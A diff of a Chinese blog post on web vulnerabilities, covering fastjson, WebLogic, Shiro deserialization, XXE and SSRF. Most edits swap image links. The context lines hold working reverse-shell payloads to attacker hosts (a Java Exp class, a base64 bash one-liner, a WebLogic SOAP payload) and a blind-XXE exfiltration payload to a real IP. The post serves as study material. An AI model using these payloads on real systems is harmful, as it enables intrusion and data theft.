 <p>1.首先在vps上将以下代码保存为Exp.java</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">public class Exp&#123;</span><br><span class="line">    public Exp() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1810,15 +1841,15 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://ip:9999/Exp&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>7.可以看到rmi服务接受到了请求，且4444端口收到shell</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143512865.png" alt="image-20220510143512865"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143516793.png" alt="image-20220510143516793"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143512865.png" alt="image-20220510143512865"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143516793.png" alt="image-20220510143516793"></p>
 <h4 id="Weblogic-T3反序列化漏洞（CVE-2018-2628）："><a href="#Weblogic-T3反序列化漏洞（CVE-2018-2628）：" class="headerlink" title="Weblogic T3反序列化漏洞（CVE-2018-2628）："></a>Weblogic T3反序列化漏洞（CVE-2018-2628）：</h4><h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><p>其基本原理是利用了T3协议的缺陷实现了Java虚拟机的RMI：远程方法调用(Remote Method Invocation)，能够在本地虚拟机上调用远端代码。</p>
 <p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/Lighird/CVE-2018-2628">https://github.com/Lighird/CVE-2018-2628</a></p>
 <p>1.利用脚本生成payload，修改ip为vps ip<br>java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 ip:9999 | xxd -p | tr -d $’\n’ &amp;&amp; echo</p>
 <p>2.将payload写入weblogic_poc.py，修改dip、dport为靶机ip端口</p>
 <p>3.启动JRMP，设置反弹shell命令<br>java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 9999 Jdk7u21 ‘bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}’</p>
 <p>4.另起一窗口，监听4444端口，运行weblogic_poc.py<br>nc –lvvp 4444</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143559652.png" alt="image-20220510143559652"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143559652.png" alt="image-20220510143559652"></p>
 <h4 id="Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）："><a href="#Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）：" class="headerlink" title="Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）："></a>Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）：</h4><p>WebLogic的WLS Security组件对外提供WebService服务，其中使用XMLDecoder来解析XML格式数据，其存在反序列化漏洞，从而导致RCE。<br>触发地址：</p>
 <p>/wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC</p>
 <p>/wls-wsat/ParticipantPortType</p>
@@ -1830,16 +1861,16 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <h4 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a>复现：</h4><p>输入payload，Content-Type为text/xml。反弹shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143648690.png" alt="image-20220510143648690"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143648690.png" alt="image-20220510143648690"></p>
 <h4 id="Apache-Shiro-反序列化漏洞（CVE-2016-4437）："><a href="#Apache-Shiro-反序列化漏洞（CVE-2016-4437）：" class="headerlink" title="Apache Shiro 反序列化漏洞（CVE-2016-4437）："></a>Apache Shiro 反序列化漏洞（CVE-2016-4437）：</h4><p><strong>复现：</strong></p>
 <p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
 <p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
 <p>访问/doLogin，勾选rememberme抓登陆的request包，修改cookie为rememberMe=1发送：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143704990.png" alt="image-20220510143704990"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143704990.png" alt="image-20220510143704990"></p>
 <p>该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了反序列化。</p>
 <p>vps监听，运行脚本，找到可利用的反射链，并输入要执行的命令：<br>java -jar shiro_tool.jar <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8080/">http://xx.xx.xx.xx:8080</a><br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143727814.png" alt="image-20220510143727814"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510143731869.png" alt="image-20220510143731869"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143727814.png" alt="image-20220510143727814"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510143731869.png" alt="image-20220510143731869"></p>
 <h2 id="九、XXE"><a href="#九、XXE" class="headerlink" title="九、XXE"></a>九、XXE</h2><h3 id="9-1-XML语言"><a href="#9-1-XML语言" class="headerlink" title="9.1 XML语言"></a>9.1 XML语言</h3><h4 id="XML："><a href="#XML：" class="headerlink" title="XML："></a>XML：</h4><p>XML 指可扩展标记语言（Extensible Markup Language），是一种很像HTML的标记语言。被设计用来传输和存储数据。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。XML和JSON 是现今互联网中最常用的两种数据交换格式。</p>
 <p><strong>PHP：</strong></p>
 <p>SimpleXMLElement</p>
@@ -1855,21 +1886,21 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>XML 标签对大小敏感</p>
 <p>XML 元素必须被正确的嵌套</p>
 <p>XML 属性值必须加引号</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144316173.png" alt="image-20220510144316173"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144316173.png" alt="image-20220510144316173"></p>
 <p><strong>XML字符实体：</strong></p>
 <p>如果把字符”&lt;”放在XML元素中，会发生错误，这是因为解析器会把他当做新元素的开始。为了避免错误，我们用XML实体来代替”&lt;”。XML中有五个预定义的实体引用。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144331250.png" alt="image-20220510144331250"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144331250.png" alt="image-20220510144331250"></p>
 <p>html是用来显示数据的；</p>
 <p>xml是用来描述、存放、传输数据的。</p>
 <h4 id="DTD："><a href="#DTD：" class="headerlink" title="DTD："></a>DTD：</h4><p>DocumentTypeDefinition即文档类型定义，用来为XML文档定义语义约束。可以<strong>嵌入在XML文档中</strong> (<strong>内部声明</strong>)，也可以<strong>独立的放在一个文件中</strong>(<strong>外部引用</strong>)。 </p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144445509.png" alt="image-20220510144445509"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144453537.png" alt="image-20220510144453537"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144456030.png" alt="image-20220510144456030"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144445509.png" alt="image-20220510144445509"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144453537.png" alt="image-20220510144453537"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144456030.png" alt="image-20220510144456030"></p>
 <p><strong>DTD实体：</strong></p>
 <p>实体在DTD内使用&lt;!ENTITY&gt;元素声明。</p>
 <p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
 <p>实体可在内部或外部进行声明。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144534027.png" alt="image-20220510144534027"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144534027.png" alt="image-20220510144534027"></p>
 <p>内部实体：</p>
 <p>&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
 <p>外部实体：</p>
@@ -1878,14 +1909,14 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>外部参数实体：<br> &lt;!ENTITY % 实体名称 SYSTEM “URI”&gt; </p>
 <p>内部实体：</p>
 <p>参数实体用%实体名称申明，引用时也用%实体名称，只能在DTD中申明，DTD中引用。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144649651.png" alt="image-20220510144649651"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144649651.png" alt="image-20220510144649651"></p>
 <p>其余实体直接用实体名称申明，引用时用&amp;实体名称，只能在DTD中申明， 可在xml文档中引用。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144655122.png" alt="image-20220510144655122"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144659025.png" alt="image-20220510144659025"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144655122.png" alt="image-20220510144655122"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144659025.png" alt="image-20220510144659025"></p>
 <p>外部实体：</p>
 <p>外部实体要在实体名称和值中间标注SYSTEM。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144709330.png" alt="image-20220510144709330"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510144712416.png" alt="image-20220510144712416"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144709330.png" alt="image-20220510144709330"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510144712416.png" alt="image-20220510144712416"></p>
 <h3 id="9-2-XXE攻击"><a href="#9-2-XXE攻击" class="headerlink" title="9.2 XXE攻击"></a>9.2 XXE攻击</h3><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>XXE漏洞是在对的外部实体数据进行处理时引发的安全问题。</p>
 <p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、SSRF、发起DOS攻击等危害。</p>
 <p><strong>触发点：</strong></p>
@@ -1901,7 +1932,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>命令执行</p>
 <p>php的expect:// 协议可以用来执行命令</p>
 <p>为了使用 expect:// 封装器，必须安装 » PECL 上的 » Expect 扩展。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510152311574.png" alt="image-20220510152311574"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510152311574.png" alt="image-20220510152311574"></p>
 <p><strong>XXE blind：</strong>可以使用外带数据通道提取数据</p>
 <p>发送数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///tmp/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % get SYSTEM &quot;http://118.178.243.60/hack.dtd&quot;&gt;</span><br><span class="line">%get;</span><br><span class="line">%text;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;info&gt;&amp;data;&lt;/info&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
@@ -1911,7 +1942,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 
 <p>vps：</p>
 <p>&lt;!ENTITY % text “&lt;!ENTITY &#37; send SYSTEM ‘<a target="_blank" rel="noopener" href="http://118.178.243.60/%xxe;&#39;&gt;&quot;&gt;">http://118.178.243.60/%xxe;&#39;&gt;&quot;&gt;</a></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510152421865.png" alt="image-20220510152421865"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510152421865.png" alt="image-20220510152421865"></p>
 <h4 id="XXE绕过："><a href="#XXE绕过：" class="headerlink" title="XXE绕过："></a>XXE绕过：</h4><p>•大小写绕过关键字</p>
 <p>•实体编码</p>
 <p>•远程DTD</p>
@@ -1920,7 +1951,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>Content-Type: application/xml </p>
 <p>Content-Type: application/json </p>
 <p>一些网站中调用的接口api可能使用json/xml传输数据</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510152452927.png" alt="image-20220510152452927"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510152452927.png" alt="image-20220510152452927"></p>
 <h3 id="9-3-XXE防御"><a href="#9-3-XXE防御" class="headerlink" title="9.3 XXE防御"></a>9.3 XXE防御</h3><h4 id="XXE防御："><a href="#XXE防御：" class="headerlink" title="XXE防御："></a>XXE防御：</h4><p>配置XML处理器使用<strong>禁用DTD</strong>、<strong>禁止外部实体</strong>解析</p>
 <p>PHP：libxml_disable_entity_loader(true);</p>
 <p>JAVA：DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</p>
@@ -1928,7 +1959,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>通过<strong>黑名单过滤</strong>用户提交的XML数据。</p>
 <h2 id="十、SSRF"><a href="#十、SSRF" class="headerlink" title="十、SSRF"></a>十、SSRF</h2><h3 id="10-1-SSRF原理"><a href="#10-1-SSRF原理" class="headerlink" title="10.1 SSRF原理"></a>10.1 SSRF原理</h3><h4 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h4><p>Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成<strong>由服务器端发起</strong>请求的一个漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
 <h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>漏洞形成的原因大多是因为服务端提供，从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。而且在大部分的web架构中<strong>服务器</strong>自身是可以<strong>访问</strong>互联网服务和<strong>所在内网资源</strong>，此时攻击者就可以传入任意地址（内网地址）来让服务器发起请求，并返回数据，进而造成SSRF攻击。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153220943.png" alt="image-20220510153220943"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153220943.png" alt="image-20220510153220943"></p>
 <h4 id="利用方式：-2"><a href="#利用方式：-2" class="headerlink" title="利用方式："></a>利用方式：</h4><p>1.扫描内网ip、端口，探测主机端口存活，获取banner信息。</p>
 <p>2.攻击运行本地运行的应用程序</p>
 <p>3.攻击内网服务（mysql、redis）</p>
@@ -1953,9 +1984,9 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>gophar</p>
 <p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
 <p><strong>file_get_contents()：</strong>这段代码使用 file_get_contents 函数从用户指定的 URL 获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153329042.png" alt="image-20220510153329042"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153329042.png" alt="image-20220510153329042"></p>
 <p><strong>curl_exec()：</strong>这段代码使用 curl_exec 函数实现获取传入的 URL ，通过curl完成一次http请求，将结果写入文件，并打印出来。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153345561.png" alt="image-20220510153345561"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153345561.png" alt="image-20220510153345561"></p>
 <h3 id="10-2-网络基础"><a href="#10-2-网络基础" class="headerlink" title="10.2 网络基础"></a>10.2 网络基础</h3><h4 id="网络基本概念："><a href="#网络基本概念：" class="headerlink" title="网络基本概念："></a>网络基本概念：</h4><p><strong>局域网：</strong></p>
 <p>局域网将一定区域内的各种计算机、外部设备和数据库连接起来形成计算机通信网，如家庭网络器、学校的机房。</p>
 <p><strong>广域网：</strong></p>
@@ -1966,7 +1997,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>B 172.16.0.0～172.31.255.255</p>
 <p>C 192.168.0.0～192.168.255.255</p>
 <p><strong>request包：</strong></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153445126.png" alt="image-20220510153445126"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153445126.png" alt="image-20220510153445126"></p>
 <p><strong>request包内容：</strong></p>
 <p>请求头部的必要部分</p>
 <p>•Host<br> 规定目标IP和端口</p>
@@ -1975,9 +2006,9 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>•Connection<br> 释放连接TCP连接<br> 若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
 <p>•Content-Type<br> 请求的规范与实体的MIME信息</p>
 <p><strong>response包内容：</strong></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153531006.png" alt="image-20220510153531006"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153531006.png" alt="image-20220510153531006"></p>
 <p><strong>URL：</strong></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153544429.png" alt="image-20220510153544429"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153544429.png" alt="image-20220510153544429"></p>
 <h4 id="curl工具："><a href="#curl工具：" class="headerlink" title="curl工具："></a>curl工具：</h4><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。</p>
 <p>curl <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
 <p>不带有任何参数时，curl 就是发出 GET 请求。</p>
@@ -1988,21 +2019,21 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>-b</p>
 <p>参数用来向服务器发送 Cookie。</p>
 <h3 id="10-3-SSRF攻击"><a href="#10-3-SSRF攻击" class="headerlink" title="10.3 SSRF攻击"></a>10.3 SSRF攻击</h3><h4 id="ssrf常用协议-http："><a href="#ssrf常用协议-http：" class="headerlink" title="ssrf常用协议-http："></a>ssrf常用协议-http：</h4><p>存在如下页面flag.php模拟内网web业务：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153740462.png" alt="image-20220510153740462"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153740462.png" alt="image-20220510153740462"></p>
 <p>可见不能够直接访问，但是可以利用ssrf访问到内网资源获取flag：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153822471.png" alt="image-20220510153822471"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153822471.png" alt="image-20220510153822471"></p>
 <h4 id="ssrf常用协议-file："><a href="#ssrf常用协议-file：" class="headerlink" title="ssrf常用协议-file："></a>ssrf常用协议-file：</h4><p>本地文件传输协议 ，主要用于访问本地计算机中的文件，ssrf中可以用来读取本地敏感文件，如/etc/passwd、/etc/hosts等。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510153836508.png" alt="image-20220510153836508"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510153836508.png" alt="image-20220510153836508"></p>
 <h4 id="ssrf常用协议-dict："><a href="#ssrf常用协议-dict：" class="headerlink" title="ssrf常用协议-dict："></a>ssrf常用协议-dict：</h4><p>dict词典网络协议，是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以用来<strong>操作redis</strong>，在ssrf中常利用此协议探测内网主机存活、内网应用程序：</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510155838617.png" alt="image-20220510155838617"></p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510155841749.png" alt="image-20220510155841749"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510155838617.png" alt="image-20220510155838617"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510155841749.png" alt="image-20220510155841749"></p>
 <h4 id="ssrf常用协议-gopher："><a href="#ssrf常用协议-gopher：" class="headerlink" title="ssrf常用协议-gopher："></a>ssrf常用协议-gopher：</h4><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大，ssrf中可以用来攻击redis、mysql等应用程序。</p>
-<p>redis协议数据流：<img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510155907442.png" alt="image-20220510155907442"></p>
+<p>redis协议数据流：<img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220510155907442.png" alt="image-20220510155907442"></p>
 <h4 id="redis："><a href="#redis：" class="headerlink" title="redis："></a>redis：</h4><p>redis是一个开源的、使用C语言编写的、支持网络交互的、可基于内存也可持久化的Key-Value、NoSQL非关系型数据库。</p>
 <p>关系型数据库，是指采用了关系模型来组织数据的数据库。简单来说，关系模式就是二维表格模型。</p>
 <p>主要代表：SQL Server，Oracle,Mysql,PostgreSQL。</p>
 <p>NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统，主要代表MongoDB，Redis、CouchDB。</p>
-<p><img src="C:\Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220510155928610.png" alt="image-20220510155928610"></p>
+<p><img src="" alt="image-20220510155928610"></p>
 <p><strong>Redis命令：</strong></p>
 <p>ping 检测是否连通且有权限执行命令</p>
 <p>info 查看redis配置信息</p>
@@ -2015,7 +2046,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
 <p>config set dir 设置备份目录</p>
 <p>config get dbfilename 读取备份文件名</p>
 <p>config set dbfilename 设置备份文件名</p>
-<p>slaveof slaveof <vpsIP> PORT 设置主从关系</p>
+<p>slaveof slaveof <vpsIP> PORT 设置主从关系 </p>
 -->
       
 
@@ -2105,7 +2136,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/07/22/Web%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/06/15/Web%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -2119,11 +2150,15 @@ http://10.211.55.2/lesson/unser/demo/5.php
   
 <nav id="article-nav">
   
-  
